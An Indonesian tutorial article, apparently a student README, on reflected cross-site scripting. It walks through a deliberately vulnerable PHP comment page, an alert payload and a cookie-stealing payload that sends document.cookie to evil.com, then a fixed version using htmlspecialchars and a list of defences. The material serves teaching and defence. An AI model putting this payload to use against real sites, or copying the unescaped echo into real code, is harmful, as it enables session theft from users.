# Artikel
# Memahami Cross-Site Scripting (XSS): Eksperimen Sederhana yang Membuka Mata Saya tentang Bahaya Web
Pendahuluan Pernahkah kamu mengisi form di website lalu tiba-tiba muncul pop-up aneh atau halaman berubah sendiri? Itulah salah satu tanda Cross-Site Scripting atau XSS — salah satu celah keamanan web yang paling sering ditemui, tapi sering dianggap “remeh”.
Dalam artikel ini, saya ingin berbagi hasil eksperimen pribadi saya menggunakan PHP sederhana. Saya sengaja membuat website rentan, mencoba menyerangnya, lalu memperbaikinya. Tujuannya bukan hanya memahami teori, tapi benar-benar merasakan bagaimana satu baris kode yang “kurang hati-hati” bisa membahayakan jutaan pengguna. Mari kita mulai perjalanan ini bersama.
Apa Itu Cross-Site Scripting (XSS)? Cross-Site Scripting (XSS) terjadi ketika penyerang berhasil menyisipkan kode JavaScript berbahaya ke dalam halaman web yang kemudian dieksekusi oleh browser korban.
Ada tiga jenis utama XSS:
*	Reflected XSS (paling mudah didemo)
*	Stored XSS
*	DOM-based XSS

Kali ini saya fokus pada Reflected XSS karena paling sederhana untuk eksperimen pemula.
Cara Kerja Serangan XSS Bayangkan ada form komentar sederhana. Jika aplikasi langsung menampilkan input pengguna tanpa membersihkannya, maka kode seperti ini bisa disisipkan: <script>alert('XSS!')</script>
Ketika halaman dimuat ulang, browser akan menjalankan script tersebut seolah-olah itu kode asli dari website. Penyerang bisa mencuri cookie, mengubah tampilan, bahkan mengarahkan user ke situs phishing.
Eksperimen Pribadi Saya Saya menggunakan XAMPP di laptop saya dan membuat dua file PHP sederhana.
1. Versi Rentan (vulnerable.php)
``` php
PHP
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Demo • Rentan</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #1e1e2e, #2a2a40);
            color: #e0e0e0;
            margin: 0;
            padding: 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 560px;
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 40px 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            text-align: center;
            color: #ff6b6b;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #ff9999;
            margin-bottom: 30px;
            font-weight: 500;
        }
        .warning {
            background: #3a1f1f;
            color: #ff6b6b;
            padding: 12px 20px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 30px;
            font-size: 0.95rem;
            border: 1px solid #ff6b6b;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        input {
            padding: 16px 20px;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 1.1rem;
        }
        input:focus {
            outline: 3px solid #ff6b6b;
        }
        button {
            padding: 16px 32px;
            background: #ff6b6b;
            color: white;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            background: #ff5252;
            transform: translateY(-3px);
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            border-left: 5px solid #ff6b6b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>✗ XSS Demo</h1>
        <p class="subtitle">Versi Rentan • Cross-Site Scripting</p>
        
        <div class="warning">
            ⚠️ Halaman ini sengaja dibuat rentan untuk keperluan edukasi
        </div>

        <form method="GET">
            <input type="text" name="komentar" placeholder="Tulis komentarmu di sini..." required>
            <button type="submit">Kirim Komentar</button>
        </form>

        <?php
        if (isset($_GET['komentar'])) {
            echo '<div class="result">';
            echo '<h2>Komentar Anda:</h2>';
            echo $_GET['komentar'];
            echo '</div>';
        }
        ?>
    </div>
</body>
</html>
```
Saya buka di browser: http://localhost/vulnerable.php?komentar=<script>alert('Halo dari XSS!')</script>

Hasil eksperimen: Pop-up “Halo dari XSS!” langsung muncul. Serangan berhasil hanya dengan satu baris kode. Saya juga mencoba mencuri cookie dengan payload lebih canggih:

<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

(untuk demo, saya hanya redirect ke halaman lokal saja agar tidak benar-benar berbahaya).

2. Versi Aman (secure.php)
``` php
PHP
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Demo • Aman</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #1e1e2e, #2a2a40);
            color: #e0e0e0;
            margin: 0;
            padding: 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 560px;
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 40px 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            text-align: center;
            color: #51cf66;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #8ce8a0;
            margin-bottom: 30px;
            font-weight: 500;
        }
        .safe-badge {
            background: #1e3a1e;
            color: #51cf66;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            margin: 0 auto 30px;
            font-size: 0.95rem;
            font-weight: 600;
            border: 1px solid #51cf66;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        input {
            padding: 16px 20px;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 1.1rem;
        }
        input:focus {
            outline: 3px solid #51cf66;
        }
        button {
            padding: 16px 32px;
            background: #51cf66;
            color: #1e1e2e;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            background: #40c55b;
            transform: translateY(-3px);
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            border-left: 5px solid #51cf66;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>✓ XSS Demo</h1>
        <p class="subtitle">Versi Aman • Terlindungi</p>
        
        <div class="safe-badge">✅ HTML Specialchars Aktif</div>

        <form method="GET">
            <input type="text" name="komentar" placeholder="Tulis komentarmu di sini..." required>
            <button type="submit">Kirim Komentar</button>
        </form>

        <?php
        if (isset($_GET['komentar'])) {
            $komentar = htmlspecialchars($_GET['komentar'], ENT_QUOTES, 'UTF-8');
            echo '<div class="result">';
            echo '<h2>Komentar Anda:</h2>';
            echo '<p>' . $komentar . '</p>';
            echo '</div>';
        }
        ?>
    </div>
</body>
</html>
```
Setelah diganti dengan htmlspecialchars(), input yang sama hanya ditampilkan sebagai teks biasa. Script tidak lagi dieksekusi.
Analisis Saya Dari eksperimen ini, saya menyadari bahwa XSS bukanlah “hacker Hollywood” yang rumit. Cukup satu kelalaian kecil — lupa membersihkan input — maka serangan bisa terjadi. Dampaknya bisa sangat serius: pencurian sesi, defacement, bahkan penyebaran malware melalui browser korban.
Cara Pencegahan yang Saya Pelajari
1.	Selalu gunakan htmlspecialchars() saat menampilkan data dari user.
2.	Content Security Policy (CSP) di header HTTP.
3.	Input validation + output encoding.
4.	Gunakan framework modern (Laravel, CodeIgniter) yang sudah punya proteksi built-in.
5.	Untuk JavaScript modern, gunakan textContent bukan innerHTML.

Kesimpulan Eksperimen kecil ini mengajarkan saya bahwa keamanan web bukanlah fitur tambahan, melainkan bagian inti dari pemrograman. Satu baris kode yang ceroboh bisa membahayakan ribuan orang. Mulai sekarang, setiap kali saya membuat form, saya selalu ingat: “Apakah input ini aman?”
Semoga artikel sederhana ini bisa menjadi pengingat bagi teman-teman developer lain bahwa keamanan itu mudah dimulai dari hal-hal kecil.

# Bukti Plagiarisme 
<img width="1920" height="1020" alt="Screenshot 2026-04-27 183559" src="https://github.com/user-attachments/assets/b0c496b9-559f-492c-bd3c-2d786557c019" />

# Isi Websitenya 
<img width="1920" height="1020" alt="image" src="https://github.com/user-attachments/assets/97e20396-5e0e-4054-8cff-7075747d78f2" />
jika saya mengetik kata di "Halo dari XSS!" maka akan menjadi seperti ini 
<img width="1920" height="1020" alt="image" src="https://github.com/user-attachments/assets/7d17f8a8-50c4-4c72-a220-32f4e7747550" />

